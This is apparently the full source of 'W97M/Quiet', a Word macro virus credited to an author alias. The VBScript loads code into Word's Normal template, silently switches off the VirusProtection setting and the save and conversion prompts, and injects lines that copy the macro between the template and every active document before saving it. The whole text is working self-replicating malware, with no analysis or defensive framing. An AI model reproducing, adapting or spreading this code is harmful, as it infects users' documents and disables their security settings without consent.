' W97M/Quiet
'    by: Total Konfuzion
Set mw=WScript.CreateObject("Word.Application")
Set nt=mw.NormalTemplate.VBProject.VBComponents(1).CodeModule
nt.AddFromFile("C:\Windows\System\Quiet.dll")
mw.Options.VirusProtection = (Rnd * 0)
mw.Options.ConfirmConversions = (Rnd * 0)
mw.Options.SaveNormalPrompt = (Rnd * 0)
mw.Options.SavePropertiesPrompt = (Rnd * 0)
nt.InsertLines 16,"If ThisDocument=ActiveDocument Then Set i=NormalTemplate Else Set i=ActiveDocument"
nt.InsertLines 17,"Vx=ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1,ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
nt.InsertLines 18,"Set d=i.VBProject.VBComponents.Item(1).CodeModule"
nt.InsertLines 19,"d.DeleteLines 1,d.CountOfLines"
nt.InsertLines 20,"d.AddFromString Vx"
nt.InsertLines 21,"ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 16, 7"
nt.InsertLines 22,"ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument"
